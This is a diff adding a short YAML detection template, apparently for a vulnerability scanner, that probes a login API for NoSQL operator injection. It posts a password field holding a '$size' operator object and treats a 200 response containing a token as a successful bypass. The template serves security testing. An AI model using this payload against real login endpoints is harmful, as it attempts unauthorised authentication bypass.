@@ -1,0 +1,21 @@
+id: nosql-46
+name: 'NoSQL $size in password'
+severity: high
+type: active
+tags:
+  - nosql
+  - injection
+  - api
+description: 'NoSQL operator $size accepted on /api/login'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"password":{"$size":""},"extra":"x"}'
+    match-all: true
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        part: body
+        regex:
+          - '"token"\s*:'
